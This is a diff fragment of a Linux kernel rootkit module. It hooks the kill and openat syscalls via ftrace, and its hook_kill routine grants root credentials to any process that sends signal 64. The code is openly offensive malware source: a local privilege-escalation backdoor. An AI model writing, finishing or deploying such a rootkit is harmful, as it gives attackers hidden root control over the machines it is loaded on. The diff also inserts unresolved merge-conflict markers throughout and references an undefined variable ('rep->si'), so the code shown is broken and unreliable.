@@ -12,6 +12,7 @@ MODULE_AUTHOR("");
 MODULE_DESCRIPTION("");
 MODULE_VERSION("");
 
+<<<<<<< HEAD
 asmlinkage int hook_open(const struct pt_regs *regs)
 {
     char *filename = (char *)rep->si;
@@ -19,6 +20,9 @@ asmlinkage int hook_open(const struct pt_regs *regs)
     return orig_open(regs);
 }
 /*
+=======
+
+>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
 asmlinkage int hook_kill(const struct pt_regs *regs)
 {
     void set_root(void);
@@ -26,7 +30,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     // pid_t pid = regs->di;
     int sig = regs->si;
 
+<<<<<<< HEAD
     if (sig == 64)
+=======
+    if ( sig == 64 )
+>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
     {
         printk(KERN_INFO "rootkit: giving root...\n");
         set_root();
@@ -35,7 +43,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     return orig_kill(regs);
 
+<<<<<<< HEAD
 */
+=======
+}
+>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
 void set_root(void)
 {
     /* prepare_creds returns the current credentials of the process */
@@ -58,8 +70,11 @@ void set_root(void)
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+<<<<<<< HEAD
     HOOK("__x64_sys_openat", hook_open, &orig_open),
 
+=======
+>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
 };
 
 /* Module initialization function */
@@ -68,7 +83,11 @@ static int __init rootkit_init(void)
     /* Hook the syscall and print to the kernel buffer */
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+<<<<<<< HEAD
     if (err)
+=======
+    if(err)
+>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
         return err;
 
     printk(KERN_INFO "rootkit: Loaded >:-)\n");
